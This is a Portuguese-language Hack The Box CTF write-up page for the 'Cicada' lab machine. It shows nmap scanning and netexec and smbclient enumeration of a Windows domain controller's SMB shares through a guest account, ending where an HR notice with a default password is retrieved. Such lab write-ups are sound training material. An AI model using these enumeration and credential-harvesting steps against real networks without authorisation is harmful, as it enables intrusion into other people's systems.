@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr"
+    data-theme="dark"
+    data-layout="centered">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+  <meta name="generator" content="Hugo 0.168.0">
+  <meta name="generator-theme" content="Book Theme: https://github.com/alex-shpak/hugo-book">
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CicadaReconNessa máquina começamos sabendo o IP 10.10.11.35. Com isso em mão, podemos começar a mapear os serviços que executam nesse IP com o NMAP:
+# Nmap 7.94SVN scan initiated Mon Oct 14 18:47:32 2024 as: /usr/lib/nmap/nmap --privileged -A -oA nmap/cicada -p- --min-rate=100000 10.10.11.35 Nmap scan report for 10.10.11.35 Host is up (0.18s latency). Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-15 05:47:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 56871/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022 (88%) Aggressive OS guesses: Microsoft Windows Server 2022 (88%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-15T05:48:47 |_ start_date: N/A |_clock-skew: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 213.87 ms 10.10.14.1 2 217.76 ms 10.10.11.35 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Oct 14 18:49:26 2024 -- 1 IP address (1 host up) scanned in 114.01 secondsPodemos notar um ambiente Windows com Active Directory e SMB. ">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="http://localhost:1313/docs/ctf/hack-the-box/machines/cicada/">
+	<meta property="og:site_name" content="Portas">
+	<meta property="og:title" content="Portas">
+	<meta property="og:description" content="CicadaReconNessa máquina começamos sabendo o IP 10.10.11.35. Com isso em mão, podemos começar a mapear os serviços que executam nesse IP com o NMAP:
+# Nmap 7.94SVN scan initiated Mon Oct 14 18:47:32 2024 as: /usr/lib/nmap/nmap --privileged -A -oA nmap/cicada -p- --min-rate=100000 10.10.11.35 Nmap scan report for 10.10.11.35 Host is up (0.18s latency). Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-15 05:47:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 56871/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022 (88%) Aggressive OS guesses: Microsoft Windows Server 2022 (88%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-15T05:48:47 |_ start_date: N/A |_clock-skew: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 213.87 ms 10.10.14.1 2 217.76 ms 10.10.11.35 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Oct 14 18:49:26 2024 -- 1 IP address (1 host up) scanned in 114.01 secondsPodemos notar um ambiente Windows com Active Directory e SMB.">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+
+
+	<meta itemprop="name" content="Portas">
+	<meta itemprop="description" content="CicadaReconNessa máquina começamos sabendo o IP 10.10.11.35. Com isso em mão, podemos começar a mapear os serviços que executam nesse IP com o NMAP:
+# Nmap 7.94SVN scan initiated Mon Oct 14 18:47:32 2024 as: /usr/lib/nmap/nmap --privileged -A -oA nmap/cicada -p- --min-rate=100000 10.10.11.35 Nmap scan report for 10.10.11.35 Host is up (0.18s latency). Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-15 05:47:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 |_ssl-date: TLS randomness does not represent time 56871/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022 (88%) Aggressive OS guesses: Microsoft Windows Server 2022 (88%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-15T05:48:47 |_ start_date: N/A |_clock-skew: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 213.87 ms 10.10.14.1 2 217.76 ms 10.10.11.35 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Oct 14 18:49:26 2024 -- 1 IP address (1 host up) scanned in 114.01 secondsPodemos notar um ambiente Windows com Active Directory e SMB.">
+	<meta itemprop="wordCount" content="2140">
+
+<title>Cicada • Portas</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.png" sizes="any">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/ctf/hack-the-box/machines/cicada/">
+<link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.5d7d2e44f776c41b94da5c54f7df9ffe0ff698ce88fe3f1b3bd9e7b1f82ccae2.js" integrity="sha256-XX0uRPd2xBuU2lxU99&#43;f/g/2mM6I/j8bO9nnsfgsyuI=" crossorigin="anonymous"></script>
+  
+</head>
+
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <div class="book-container flex">
+    
+<aside class="book-menu" aria-label="Menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" role="searchbox" enterkeyhint="search"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results" aria-live="polite"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6652e0280f4a0b30fa40b02437030f68" class="toggle" checked />
+    <label for="section-6652e0280f4a0b30fa40b02437030f68" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-58e18b116dcb674821e213ec0945416f" class="toggle" checked />
+    <label for="section-58e18b116dcb674821e213ec0945416f" class="flex">
+      <a role="button" class="">
+        Hack the Box</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-494dc92d9104717a20a45ff4de94fed4" class="toggle"  />
+    <label for="section-494dc92d9104717a20a45ff4de94fed4" class="flex">
+      <a role="button" class="">
+        Challenges (web)</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="">
+      Breaking Grad</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="">
+      Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="">
+      Templated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/toxic/" class="">
+      Toxic</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b358f1a871f27b6123c59716f1b3428c" class="toggle" checked />
+    <label for="section-b358f1a871f27b6123c59716f1b3428c" class="flex">
+      <a role="button" class="">
+        Machines</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/blurry/" class="">
+      Blurry</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/certified/" class="">
+      Certified</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/cicada/" class="active">
+      Cicada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="">
+      Monitorsthree</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c7059daadfdbaf53fa1366c3499caad7" class="toggle"  />
+    <label for="section-c7059daadfdbaf53fa1366c3499caad7" class="flex">
+      <a role="button" class="">
+        Juice Shop</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      Cross Site Scriping</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/injection/" class="">
+      Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/readme/" class="">
+      Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <header class="book-header hidden">
+      
+  <div class="flex align-center justify-between gap">
+  <input type="checkbox" class="toggle" id="menu-control" />
+  <label for="menu-control" aria-label="Menu">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#menu"></use></svg>
+  </label>
+
+  <div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+
+  
+  <input type="checkbox" class="toggle" id="toc-control" />
+  <label for="toc-control" aria-label="Table of Contents">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#toc"></use></svg>
+  </label>
+  
+</div>
+
+ 
+    </header>
+
+    <main class="book-page">
+      
+      
+  
+
+      
+  <article class="markdown book-article"><h1 id="cicada">Cicada<a class="anchor" href="#cicada" aria-label="Link"></a></h1>
+<figure><img src="/assets/image%20%28188%29.png">
+</figure>
+
+<h3 id="recon">Recon<a class="anchor" href="#recon" aria-label="Link"></a></h3>
+<p>Nessa máquina começamos sabendo o IP <code>10.10.11.35</code>. Com isso em mão, podemos começar a mapear os serviços que executam nesse IP com o NMAP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Mon Oct 14 18:47:32 2024 as: /usr/lib/nmap/nmap --privileged -A -oA nmap/cicada -p- --min-rate=100000 10.10.11.35</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.35
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65526</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-15 05:47:42Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>56871/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-10-15T05:48:47
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: 6h59m58s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 445/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   213.87 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   217.76 ms 10.10.11.35
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Mon Oct 14 18:49:26 2024 -- 1 IP address (1 host up) scanned in 114.01 seconds</span></span></span></code></pre></div><p>Podemos notar um ambiente Windows com Active Directory e SMB. </p>
+<h4 id="smb">SMB<a class="anchor" href="#smb" aria-label="Link"></a></h4>
+<p>Começo enumerando o SMB na tentativa de conseguir acesso a arquivos e pastas sem autenticação no sistema:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  nxc smb 10.10.11.35 --shares
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domai
+</span></span><span style="display:flex;"><span>n:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> IndexError: list index out of range
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_USER_SESSION_DELETED
+</span></span><span style="display:flex;"><span>➜ nxc smb 10.10.11.35 -u <span style="color:#e6db74">&#34;guest&#34;</span> -p  <span style="color:#e6db74">&#34;&#34;</span> --shares
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domai
+</span></span><span style="display:flex;"><span>n:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\g</span>uest:
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        DEV
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        HR              READ
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        NETLOGON                        Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        SYSVOL                          Logon server share</span></span></code></pre></div><p>É possível notar o diretório HR disponível para leitura, podemos ver os documentos dentro e possivelmente ler o conteúdo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  smbclient //10.10.11.35/HR
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\a</span>rt<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:29:09 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  Notice from HR.txt                  A     <span style="color:#ae81ff">1266</span>  Wed Aug <span style="color:#ae81ff">28</span> 13:31:48 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">397148</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get Notice from HR.txt .
+</span></span><span style="display:flex;"><span>NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span style="color:#ae81ff">\N</span>otice
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get Notice from HR.txt
+</span></span><span style="display:flex;"><span>NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span style="color:#ae81ff">\N</span>otice
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Notice from HR.txt&#34;</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\N</span>otice from HR.txt of size <span style="color:#ae81ff">1266</span> as Notice from HR.txt <span style="color:#f92672">(</span>1.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ^C
+</span></span><span style="display:flex;"><span>➜  ls
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;Notice from HR.txt&#39;</span></span></span></code></pre></div><p>O conteúdo desse documento informa uma senha padrão para os funcionários, e sugere que seja trocada após o primeiro login:<br></p>
+<figure><img src="/assets/image%20%28190%29.png">
+</figure>
+
